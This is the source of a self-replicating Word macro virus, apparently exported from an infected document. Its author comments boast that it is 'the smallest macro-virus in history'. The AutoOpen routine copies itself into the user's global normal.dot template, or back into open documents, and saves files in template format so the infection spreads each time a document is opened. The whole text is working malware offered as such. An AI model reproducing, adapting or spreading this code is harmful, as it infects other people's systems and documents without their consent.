   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AutoOpen"

   'The SMALLEST Macro-virus in history  ;)
   '(c) Master of infection
   'Queen Hitman Virus inc.
   Public Sub MAIN()
   Dim nn$
   Dim n1$
   Dim n2$
   nn$ = WordBasic.[DefaultDir$](2) + "/normal.dot"
   n1$ = WordBasic.[FileName$]() + ":AutoOpen"
   n2$ = nn$ + ":AutoOpen"
   On Error GoTo -1: On Error GoTo cont
   WordBasic.MacroCopy n1$, n2$
   GoTo okey
   cont:
   WordBasic.MacroCopy n2$, n1$
   On Error Goto -1 : On Error Goto err.Number
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
   WordBasic.CurValues.FileSaveAs dlg
   dlg.Format = 1
   WordBasic.FileSaveAs dlg
   GoTo okey
   Err.Number:
   WordBasic.MsgBox "ERROR!", 16
   okey:
   WordBasic.MsgBox "OK!", 64
   End Sub
